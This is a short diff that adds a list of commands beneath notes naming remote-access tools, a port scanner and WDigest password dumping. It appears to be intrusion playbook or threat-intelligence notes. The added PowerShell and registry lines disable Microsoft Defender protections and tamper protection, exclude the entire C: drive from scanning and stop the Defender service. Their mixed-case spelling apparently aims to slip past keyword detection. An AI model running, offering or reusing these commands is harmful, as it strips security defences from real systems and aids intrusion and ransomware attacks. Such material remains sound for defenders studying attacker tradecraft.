@@ -5,3 +5,19 @@ Chrome Remote Desktop
 Advanced Port Scanner
 
 WDigest Clear-Text Password Dumping
+
+
+
+Comands:
+
+Set-MpPreFerence -DisableBehaviorMonitoring $true
+Set-MpPreference -DIsableIOAVProtection $true
+Set-MpPreference -DisablePrivacymode $true
+Set-MpPreference -DisableIntrusionPreventioNSystem $true
+Set-MpPreference -EnableControlledFolderAccess disabled
+Set-MpPreference -MAPSReporting Disabled
+Set-MpPrefErence -SubmitSamplesConsent 2
+reg add "HKLM\SOFTWARE\Microsoft|Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /D 0 /f
+Add-MpPreference -ExclusionPath "C:\"
+Stop-Service -NamE WinDefend -Force
+Start-Service -Name WinDefend
